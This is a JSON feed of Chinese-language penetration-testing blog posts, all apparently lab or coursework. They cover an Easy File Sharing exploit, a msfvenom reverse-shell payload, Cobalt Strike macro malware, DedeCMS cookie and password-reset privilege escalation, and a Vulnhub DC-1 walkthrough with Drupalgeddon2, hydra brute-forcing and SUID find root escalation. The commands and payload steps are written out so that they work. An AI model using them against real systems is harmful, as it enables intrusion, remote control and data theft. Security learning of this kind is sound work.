{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"渗透\" tag",
    "description": "夜深忽夢少年事",
    "home_page_url": "http://meviv.github.io",
    "items": [
        {
            "id": "http://meviv.github.io/2022/11/05/%E6%B8%97%E9%80%8F/rearch/",
            "url": "http://meviv.github.io/2022/11/05/%E6%B8%97%E9%80%8F/rearch/",
            "title": "渗透复现任务A",
            "date_published": "2022-11-05T07:16:53.000Z",
            "content_html": "<p>实验课复现内容</p>\n<span id=\"more\"></span>\n<h1 id=\"漏洞渗透测试\"><a class=\"markdownIt-Anchor\" href=\"#漏洞渗透测试\">#</a> 漏洞渗透测试</h1>\n<p>1、靶机 (Windows) 安装 easy file sharing server（efssetup_2018.zip)，该服务存在漏洞。<br>\n2、利用 Nmap 扫描发现靶机 (Windows) 运行了该服务。P99-100<br>\n3、利用该漏洞，使得靶机运行计算器。P116-119</p>\n<h2 id=\"环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<p>靶机：WinXP<br>\n 开启 easy file sharing 服务<br>\n攻击机：kali2022<br>\n 两机位于同一网段内，需要相互 ping 通<br>\n (如遇无法 ping 通的情况，可关闭 winXP 的防火墙)</p>\n<h2 id=\"渗透过程\"><a class=\"markdownIt-Anchor\" href=\"#渗透过程\">#</a> 渗透过程</h2>\n<p>打开 kail 攻击机，扫描同一子网下主机</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>arp-scan -l</pre></td></tr></table></figure><p><img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7vmu7z7poj30k505dwfp.jpg\" alt=\"\"><br>\n对靶机进行进一步扫描，查看端口开放情况</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap -sV -A 192.168.232.132</pre></td></tr></table></figure><p><img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7vmub58p8j30ni0is43b.jpg\" alt=\"\"><br>\n知道了靶机开放端口服务<br>\n使用 searchsploit</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>searchsploit easy file sharing</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>searchsploit -m 39009</pre></td></tr></table></figure><p><img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7vmuf74hwj31bn0khjz7.jpg\" alt=\"\"><br>\n运行脚本 python2+path+ip+port</p>\n<div class=\"note info\">\n<p>由于脚本输出没有使用严格括号，需要声明 py2 运行</p>\n</div>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python2 &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;windows&#x2F;remote&#x2F;39009.py 192.168.232.132 80</pre></td></tr></table></figure><p><img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h7vmul45h6j30iw023dg1.jpg\" alt=\"\"><br>\nDone 表示脚本执行完成，打开靶机发现计算器已弹出<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7vmuohza7j309a09b3z6.jpg\" alt=\"\"><br>\n至此完成渗透</p>\n<h1 id=\"metasploit应用\"><a class=\"markdownIt-Anchor\" href=\"#metasploit应用\">#</a> Metasploit 应用</h1>\n<p>1、生成主控端、被控端。<br>\n2、获得靶机 (Windows) 控制权。<br>\n3、下载靶机上任意一个文件。P121-123;140-145</p>\n<h2 id=\"环境搭建-2\"><a class=\"markdownIt-Anchor\" href=\"#环境搭建-2\">#</a> 环境搭建</h2>\n<p>靶机：winXP (192.168.232.132)<br>\n 攻击机：kali (192.168.232.130)<br>\n 注意两机位于同一网段内</p>\n<h2 id=\"渗透过程-2\"><a class=\"markdownIt-Anchor\" href=\"#渗透过程-2\">#</a> 渗透过程</h2>\n<p>生成被控端，在 kali 以 root 账户执行</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.232.130 lport&#x3D;5000 -f exe -o &#x2F;root&#x2F;payload.exe</pre></td></tr></table></figure><p>生成 payload.exe 后传到靶机<br>\n<img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h7vmura9z5j30om03tdgt.jpg\" alt=\"\"><br>\n生成主控端<br>\n再次以 root 账户执行</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use exploit&#x2F;multi&#x2F;handler</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>set lhost 192.168.232.130</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>set lport 5000</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>exploit</pre></td></tr></table></figure><p><img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h7vmuyixy0j30oi0is43x.jpg\" alt=\"\"><br>\n此时，将生成的 payload.exe 程序复制到靶机上运行<br>\n成功获取权限<br>\n执行 ls 查看需要的文件。输入 dowload log.txt 下载文件<br>\n<img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h7vmv0mr1rj30ha0ecwj3.jpg\" alt=\"\"><br>\n成功下载文件<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7vmv28ro7j30i00e7jry.jpg\" alt=\"\"></p>\n",
            "tags": [
                "Python",
                "渗透"
            ]
        },
        {
            "id": "http://meviv.github.io/2022/09/18/%E6%B8%97%E9%80%8F/cobalt/",
            "url": "http://meviv.github.io/2022/09/18/%E6%B8%97%E9%80%8F/cobalt/",
            "title": "CS实现宏病毒植入",
            "date_published": "2022-09-18T02:25:00.000Z",
            "content_html": "<p>Cobalt</p>\n<span id=\"more\"></span>\n<h1 id=\"环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#环境搭建\">#</a> 环境搭建</h1>\n<p>CS 分为服务端和客服端<br>\n服务端一般使用 linux 搭建，建议修改端口避免暴露<br>\n将 CS 文件分别复制到 linux 服务端和攻击机<br>\n服务端为 kali2022<br>\n 攻击机为 win10<br>\n 靶机为 win10</p>\n<h1 id=\"渗透过程\"><a class=\"markdownIt-Anchor\" href=\"#渗透过程\">#</a> 渗透过程</h1>\n<p>在 kali 的 CS 路径下打开终端<br>\n运行： ./teamserver IP password</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>.&#x2F;teamserver 192.168.232.130 695847</pre></td></tr></table></figure><p><img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7wjmfp0jsj30lp04wmy7.jpg\" alt=\"\"><br>\n打开客户端 CS，输入服务端 IP, 服务端端口，用户名 (随意)，密码<br>\n<img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h7wjmhlxllj30d908w3zf.jpg\" alt=\"\"><br>\n新建一个监听会话<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7wjmk1fimj30fr08mgm0.jpg\" alt=\"\"><br>\n<img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h7wjmlsik5j31hc0jo75n.jpg\" alt=\"\"><br>\n配置可自行调整<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7wjmom65bj30d30gnmyi.jpg\" alt=\"\"><br>\n创建完成后打开 payload, 选择 office 宏<br>\n<img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h7wjmr1bvmj30f2071gmi.jpg\" alt=\"\"><br>\n选择刚刚创建的监听，复制病毒代码<br>\n<img data-src=\"https://tva1.sinaimg.cn/large/007dFS7lly8h7wjmskkoqj309o04874l.jpg\" alt=\"\"><br>\n<img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h7wjrbuvr9j30dl08hgmv.jpg\" alt=\"\"><br>\n创建一个 word 文档</p>\n<div class=\"note info\">\n<p>如果电脑有杀毒软件，先创建信任区，需要在信任区内保存病毒文件</p>\n</div>\n<p>打开宏，创建宏，注意创建位置选择新建的文档<br>\n<img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h7wjrdzfd0j30vs0d3gmj.jpg\" alt=\"\"><br>\n<img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h7wjs31idlj30cg0cxjrq.jpg\" alt=\"\"><br>\n将复制的恶意代码粘贴到新建的宏中，保存<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7wjs59ju8j31780jctez.jpg\" alt=\"\"><br>\n将恶意文件另存到信任区中，保存类型为启用宏的 word 文档<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7wjs7mfukj307301n3yg.jpg\" alt=\"\"><br>\n当靶机打开文件时，CS 显示目标已上线<br>\n打开监听会话操控靶机<br>\n<img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h7wjsa1rh4j30sq0cuta3.jpg\" alt=\"\"><br>\n通过命令下载靶机目标文件，对靶机截图<br>\n<img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h7wjscdzztj30mx053js8.jpg\" alt=\"\"><br>\n<img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h7wjsllou2j31b60j4jy4.jpg\" alt=\"\"><br>\n通过该会话可以进行更多渗透操作</p>\n<p>End</p>\n",
            "tags": [
                "渗透",
                "Java"
            ]
        },
        {
            "id": "http://meviv.github.io/2022/07/08/%E6%B8%97%E9%80%8F/dedecms02/",
            "url": "http://meviv.github.io/2022/07/08/%E6%B8%97%E9%80%8F/dedecms02/",
            "title": "织梦系统渗透测试贰",
            "date_published": "2022-07-08T04:34:00.000Z",
            "content_html": "<p>登录后台管理系统</p>\n<span id=\"more\"></span>\n<h1 id=\"工具\"><a class=\"markdownIt-Anchor\" href=\"#工具\">#</a> 工具</h1>\n<p>Burpsuite</p>\n<h1 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h1>\n<p>前面登录管理员账户后，还没有成功登录网站后台，所以继续进行尝试<br>\n想要登录网站后台光靠 cookie 是不行的，得有正经的密码<br>\n原来的思路是修改密码时抓包<br>\n但是修改密码必须提供原密码，尝试几次后放弃了，还是尝试忘记密码重置<br>\n通过几次抓包都没有有用信息，Forward 后就返回了，<br>\n得设置个安全问题才能继续，最后用无安全问题进入重置<br>\n<img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h3zouozcfaj30r10b4gmx.jpg\" alt=\"\"><br>\n抓包，发到 repeater<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h3zovqgw1nj31hc0u0gr0.jpg\" alt=\"\"><br>\n 修改 id=1,userid=admin,safequestion=0.0, 发包<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h3zoyhj47aj31hc0u0tho.jpg\" alt=\"\"><br>\n得到一个网址，将 uploads 改为网站 ip<br>\n<img data-src=\"https://tva1.sinaimg.cn/large/007dFS7lly8h3zp0e2yq3j30cp04v74d.jpg\" alt=\"\"><br>\n 访问失败，再次观察网址发现 get 请求有错，得把两个 amp; 删掉<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h3zp3klke8j30qr0aj75f.jpg\" alt=\"\"><br>\n<img data-src=\"https://tva1.sinaimg.cn/large/007dFS7lly8h3zp413dpkj30ck04h74d.jpg\" alt=\"\"><br>\n成功进入并且修改管理账号密码<br>\n吊诡的是虽然显示修改成功但实际上密码还是错误 (为此我反复抓包修改搞了两个多小时)<br>\n 最后发现退出 admin 后 cookie 就删了，得保持 admin 账号登录的情况下新建标签页重置密码<br>\n<img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h3zpvj0ytlj31hc0u0q95.jpg\" alt=\"\"><br>\n再次抓包发到 repeater 并修改密码，修改后直接进入会员中心 - 系统设置<br>\n使用刚刚修改的密码重设<br>\n<img data-src=\"https://tva1.sinaimg.cn/large/007dFS7lly8h3zq7pskmkj30qq0mq40p.jpg\" alt=\"\"><br>\n<img data-src=\"https://tva1.sinaimg.cn/large/007dFS7lly8h3zq8gxr59j30cj04q0st.jpg\" alt=\"\"><br>\n打开 dede，登录网站后台管理系统<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h3zqmlkh9dj30cm04omxa.jpg\" alt=\"\"><br>\n成功进入网站后台</p>\n",
            "tags": [
                "渗透",
                "Web"
            ]
        },
        {
            "id": "http://meviv.github.io/2022/07/06/%E6%B8%97%E9%80%8F/dedecms01/",
            "url": "http://meviv.github.io/2022/07/06/%E6%B8%97%E9%80%8F/dedecms01/",
            "title": "织梦系统渗透测试壹",
            "date_published": "2022-07-06T11:41:29.000Z",
            "content_html": "<p>获得管理账户</p>\n<span id=\"more\"></span>\n<h2 id=\"工具\"><a class=\"markdownIt-Anchor\" href=\"#工具\">#</a> 工具</h2>\n<p>Burpsuite</p>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h2>\n<p>开始注册了一个 ID 为 viv 的账号，在登录时想要通过抓包修改 userid 来实现越权<br>\n于是我修改了 userid 为 1，并且修改了 userid 的 md5 加密值<br>\n发包后直接返回了登录页面<br>\n<img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h3yn2hx5wxj31hc0u044w.jpg\" alt=\"\"><br>\n<img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h3yn2u7qszj30ra0bodhb.jpg\" alt=\"\"><br>\n就知道没这么简单<br>\n再次抓包，发现这个账号 userid 的 md5 值与 md5 的直接加密值不一样，猜测还有一次加密<br>\n尝试了 b64 和一些加密方式后再进行 md5，还是没法对应<br>\n这时发现访问个人空间时会基于 id 生成对应的 ckMd5 值，想到如果用户名为 1 时，就直接有了对应的 ckMd5 值了<br>\n<img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h3yn4319ckj30r205g0t6.jpg\" alt=\"\"><br>\n于是注册一个用户名为 1 的账户<br>\n<img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h3yn4ubfxcj30cg04dglq.jpg\" alt=\"\"><br>\n注册失败了，用户名不够长，那就注册一个 00001 进行尝试<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h3yn5hmnsgj31hc0u07bj.jpg\" alt=\"\"><br>\n登录抓包，用 vid 替换 userid 的值，vid_ckMd5 替换 userid_ckMd5 的值<br>\n成功登录管理员账户<br>\n<img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h3yn5somwzj30qq0fv767.jpg\" alt=\"\"><br>\n F12 查看 cookie，修改 DedeUserID 和 DedeUserID__ckMd5 的值，与 vid 对应<br>\n<img data-src=\"https://tva1.sinaimg.cn/large/007dFS7lly8h3yn6ha50sj30r30a7myf.jpg\" alt=\"\"><br>\n返回网站首页，这时登录页面也变成了管理员账户，至此完成越权</p>\n",
            "tags": [
                "渗透",
                "Web"
            ]
        },
        {
            "id": "http://meviv.github.io/2022/03/06/%E6%B8%97%E9%80%8F/DC-1/",
            "url": "http://meviv.github.io/2022/03/06/%E6%B8%97%E9%80%8F/DC-1/",
            "title": "Vulnhub DC1",
            "date_published": "2022-03-06T11:41:29.000Z",
            "content_html": "<p>DC-1</p>\n<span id=\"more\"></span>\n<h1 id=\"靶机下载\"><a class=\"markdownIt-Anchor\" href=\"#靶机下载\">#</a> 靶机下载</h1>\n<p>下载地址为 https://download.vulnhub.com/dc/DC-1.zip<br>\n 可在 https://download.vulnhub.com 查看相关下载<br>\n攻击机为 kali2022<br>\n 两机均用 nat 连接</p>\n<h1 id=\"渗透过程\"><a class=\"markdownIt-Anchor\" href=\"#渗透过程\">#</a> 渗透过程</h1>\n<h2 id=\"flag1\"><a class=\"markdownIt-Anchor\" href=\"#flag1\">#</a> flag1</h2>\n<p>打开 kali 扫描靶机</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>arp-scan -l</pre></td></tr></table></figure><p><img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h7r6tgjanfj30kb054dh3.jpg\" alt=\"\"><br>\n也可以使用 nmap 扫描 (此处请根据实际修改 IP)</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ifconfig</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>nmap -sP 192.168.232.0&#x2F;24</pre></td></tr></table></figure><p><img data-src=\"https://tva1.sinaimg.cn/large/007dFS7lly8h7r6tnpodaj30hz0hrwi3.jpg\" alt=\"\"><br>\n发现目标主机后扫描开放端口</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap -sV -A 192.168.232.133</pre></td></tr></table></figure><p><img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7r6tq4q65j30n00leq8f.jpg\" alt=\"\"><br>\n发现开启了 80 端口，访问 ip 查看页面信息<br>\n<img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h7r6urp8tyj313q0fqq54.jpg\" alt=\"\"><br>\n通过 Wappalyzer 发现网站 CMS 为 Drupal<br>\n 使用 msf 进行渗透</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>search Drupal</pre></td></tr></table></figure><p><img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7r6vde7ujj30v108atbb.jpg\" alt=\"\"><br>\n用较新的漏洞进行尝试</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_druopalgeddon2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>show options</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>set RHOSTS 192.168.232.131</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>run</pre></td></tr></table></figure><p><img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h7r70q4gx2j30v80gadiu.jpg\" alt=\"\"><br>\n成功得到 shell，使用 py 得到交互 shell</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shell</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</pre></td></tr></table></figure><p>查看文件目录发现第一个 flag 执行 cat 命令查看内容<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7r6vtw46ij30gp06cdh3.jpg\" alt=\"\"></p>\n<h2 id=\"flag2\"><a class=\"markdownIt-Anchor\" href=\"#flag2\">#</a> flag2</h2>\n<p>该 flag 提示查找 Drupal 框架配置文件</p>\n<div class=\"note info\">\n<p>Drupal 默认数据库配置连接–&gt;/sites/default/settings.php</p>\n</div>\n<p>直接 cd 到该目录下查看</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cd &#x2F;var&#x2F;www&#x2F;sites&#x2F;default</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ls</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>cat settings.php</pre></td></tr></table></figure><p><img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7r6w11qo6j30cp0ay752.jpg\" alt=\"\"></p>\n<h2 id=\"flag3\"><a class=\"markdownIt-Anchor\" href=\"#flag3\">#</a> flag3</h2>\n<p>在 flag2 里发现了数据库用户和密码，连接一手</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql -udbuser -pR0ck3t</pre></td></tr></table></figure><p>select * from users 查询得 admin 账户<br>\n<img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h7r6wbj2g6j30kv07vq43.jpg\" alt=\"\"><br>\n由于得到的密码是密文，无法直接登录，这里有两种方法解决<br>\n方法一：更改账户密码<br>\n使用 Drupal 对数据库的加密方法，加密脚本位置在网站根目录下的 scripts 下<br>\n回到 /var/www 路径下，运行这个 password-hash.sh 加密脚本，得到新密码</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cd &#x2F;var&#x2F;www</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>php scripts&#x2F;password-hash.sh 114514</pre></td></tr></table></figure><p><img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h7r6wdpvp6j30l9021aac.jpg\" alt=\"\"><br>\n将密文更改密码 (此处建议恶补 sql 语句)</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>update users set pass&#x3D;&#39;$S$Db1FwryLsYBPfvEpR870QjGzJfPi64teqeVZrAZyjMh7HND&#x2F;Ca4q&#39; where uid&#x3D;1;</pre></td></tr></table></figure><p><img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7r6wgbk4yj30mf01yaai.jpg\" alt=\"\"><br>\n回到靶机 80 端口开放的页面进行登录，<br>\n在 Dashboard 得到第三个 flag<br>\nSpecial PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.<br>\n<img data-src=\"https://tva1.sinaimg.cn/large/007dFS7lly8h7r6wibgldj30u10enmyq.jpg\" alt=\"\"><br>\n<img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h7r6wl7u4oj30ji04idfy.jpg\" alt=\"\"><br>\n 方法二：利用漏洞添加账户</p>\n<div class=\"note info\">\n<p>SearchSploit 是一个用于搜索 Exploit-DB 漏洞数据的命令行工具，它可以允许你离线 Exploit 数据库，这样你就可以在本地执行离线搜索，这对于有时候不能联网的渗透工作非常的有用。</p>\n</div>\n<p>之前使用 Wappalyzer 知道 drupal 版本为 7.2<br>\n 利用 searchsploit 进行攻击</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>searchsploit drupal</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>python &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;34992.py -t http:&#x2F;&#x2F;192.168.232.133 -u admin2 -p 114514</pre></td></tr></table></figure><p><img data-src=\"https://tva1.sinaimg.cn/large/007dFS7lly8h7rwps4awpj30q60lstbk.jpg\" alt=\"\"></p>\n<div class=\"note info\">\n<p>这里使用 py2 的原因是 py2 对于 print 的使用不严<br>\n如果在使用以上命令有报错可以尝试声明 python2</p>\n</div>\n<p>重新登录一下 mysql 查看，发现用户已经添加了<br>\n<img data-src=\"https://tva1.sinaimg.cn/large/007dFS7lly8h7rwqh9q6vj30h206yjsm.jpg\" alt=\"\"></p>\n<h2 id=\"flag4\"><a class=\"markdownIt-Anchor\" href=\"#flag4\">#</a> flag4</h2>\n<p>flag 的提示词是 passwd、-exec、shadow，看一下 /etc/passwd, 发现 flag4<br>\n 看一下 /home/flag4 的文件，尝试 cat flag4/flag4.txt，拿到 flag4，发现提示我们将权限提升到 root<br>\n<img data-src=\"https://tva2.sinaimg.cn/large/007dFS7lly8h7rwqlc992j30gx0c3q63.jpg\" alt=\"\"><br>\n<img data-src=\"https://tva3.sinaimg.cn/large/007dFS7lly8h7rwt9jsdqj30ep02emxd.jpg\" alt=\"\"><br>\n 根据提示把权限提升至 root, 进行 SUID 提权</p>\n<div class=\"note info\">\n<p>什么是 suid？suid 全称是 Set owner User ID up on execution。这是 Linux 给可执行文件的一个属性。通俗的理解为其他用户执行这个程序的时候可以用该程序所有者 / 组的权限。需要注意的是，只有程序的所有者是 0 号或其他 super user，同时拥有 suid 权限，才可以提权。<br>\n一个典型的例子是将 SUID 权限分配给 find 命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道’find’命令包含用于执行命令的参数，但攻击者可以以 root 特权执行命令。</p>\n</div>\n<p>find 命令是包含用于执行命令的参数的，如果 find 以 SUID 权限运行，所有通过 find 执行的命令都会以 root 权限运行。<br>\n也可以用 hydra 工具爆破密码，下载 John 密码包</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>wget clone http:&#x2F;&#x2F;www.openwall.com&#x2F;john&#x2F;j&#x2F;john-1.8.0.tar.gz</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>tar -xvf john-1.8.0.tar.gz</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>cd john-1.8.0&#x2F;src</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>make linux-x86-64</pre></td></tr></table></figure><p>使用如下命令进行暴力破解</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra -l flag4 -P john-1.8.0&#x2F;run&#x2F;password.lst ssh:&#x2F;&#x2F;192.168.101.11 -f -vV -o hydraflag4.ssh</pre></td></tr></table></figure><p>如果直接进行了提权操作就不需要对 flag4 进行暴力破解了，可以直接看到 flag4 信息，但 flag4 用户无法查看 /root 目录内的文件信息<br>\n建议进行提权<br>\n Flag4:<br>\nCan you use this same method to find or access the flag in root?<br>\nProbably. But perhaps it’s not that easy.  Or maybe it is?<br>\n 你能用同样的方法来查找或访问根目录中的标志吗？<br>\n可能。但也许不是那么容易。或许是这样？</p>\n<h2 id=\"flag5\"><a class=\"markdownIt-Anchor\" href=\"#flag5\">#</a> flag5</h2>\n<p>首先找一下有 SUID 权限的文件</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>find &#x2F; -perm -4000</pre></td></tr></table></figure><p><img data-src=\"https://tva4.sinaimg.cn/large/007dFS7lly8h7rwqxsio0j30ev0b7403.jpg\" alt=\"\"><br>\n看到 find 命令有 SUID 权限，所以这里可以利用 find 命令进行提权<br>\n用 find 命令包含的 - exec 参数进行提权</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>find &#x2F;var&#x2F;www -exec &quot;&#x2F;bin&#x2F;sh&quot; \\;</pre></td></tr></table></figure><p>这个命令中的 /bin/sh 是 linux 内核和用户之间的命令解释器，由此完成提权<br>\n得到最后一个 flag<br>\n<img data-src=\"https://tva1.sinaimg.cn/large/007dFS7lly8h7rwr3veq8j30gn0aawg2.jpg\" alt=\"\"><br>\nthefinalflag:<br>\nWell done!!!<br>\nHopefully you’ve enjoyed this and learned some new skills.<br>\nYou can let me know what you thought of this little journey<br>\nby contacting me via Twitter - @DCAU7<br>\n 做得好！！！！！<br>\n希望你喜欢这个并学到了一些新的技能。<br>\n你对这次小旅行的看法。<br>\n通过 Twitter 联系我 -@dcau7</p>\n<p>End</p>\n",
            "tags": [
                "渗透"
            ]
        }
    ]
}